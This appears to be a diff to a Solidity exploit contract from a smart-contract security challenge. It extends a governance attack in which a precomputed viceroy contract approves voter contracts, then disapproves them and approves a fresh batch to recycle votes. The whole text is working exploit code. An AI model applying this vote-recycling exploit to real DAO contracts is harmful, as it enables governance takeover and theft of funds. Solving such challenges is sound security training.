@@ -131,24 +131,31 @@ contract GovernanceAttacker {
         uint256 proposalId = uint256(keccak256(proposal));
 
         uint nonce = 1;
-        address[] memory preCalcedVoters = getPreCalculatedAddresses(type(AttackerVoter).creationCode, 0, 5);
-        address preCalcedViceroy = getViceroyAddress(governance, proposal, preCalcedVoters);
+        address[] memory preCalcedVotersA = getPreCalculatedAddresses(type(AttackerVoter).creationCode, 0, 5);
+        address[] memory preCalcedVotersB = getPreCalculatedAddresses(type(AttackerVoter).creationCode, 5, 10);
+        address preCalcedViceroy = getViceroyAddress(governance, proposal, preCalcedVotersA);
 
         // elect viceroy
         governance.appointViceroy(preCalcedViceroy, nonce);
 
         // deploy viceroy
-        AttackerViceroy viceroy = deployViceroyAttack(governance, proposal, preCalcedVoters);
+        AttackerViceroy viceroy = deployViceroyAttack(governance, proposal, preCalcedVotersA);
 
         // deploy voter
         deployVoters(5);
 
         // vote
-        for (uint i; i < preCalcedVoters.length; i++) {
-            AttackerVoter(preCalcedVoters[i]).vote(governance, proposalId, address(viceroy));
+        for (uint i; i < preCalcedVotersA.length; i++) {
+            AttackerVoter(preCalcedVotersA[i]).vote(governance, proposalId, address(viceroy));
         }
         (uint votes, ) = governance.proposals(proposalId);
-        assert(votes == preCalcedVoters.length);
+        assert(votes == preCalcedVotersA.length);
+
+        // dissaprove old voters
+        viceroy.disapproveVoters();
+
+        // approve new voters
+        viceroy.approveNewVoters(preCalcedVotersB);
     }
 
     function deployViceroyAttack(
@@ -208,10 +215,30 @@ contract GovernanceAttacker {
 }
 
 contract AttackerViceroy {
-    constructor(Governance governance, bytes memory proposal, address[] memory voters) {
+    Governance governance;
+    address[] voters;
+
+    constructor(Governance _governance, bytes memory proposal, address[] memory _voters) {
+        governance = _governance;
+        voters = _voters;
+
         governance.createProposal(address(this), proposal);
         for (uint i; i < voters.length; i++) {
             address voter = voters[i];
+            governance.approveVoter(voter);
+        }
+    }
+
+    function disapproveVoters() public {
+        for (uint i; i < voters.length; i++) {
+            address voter = voters[i];
+            governance.disapproveVoter(voter);
+        }
+    }
+
+    function approveNewVoters(address[] memory _newVoters) public {
+        for (uint i; i < _newVoters.length; i++) {
+            address voter = _newVoters[i];
             governance.approveVoter(voter);
         }
     }
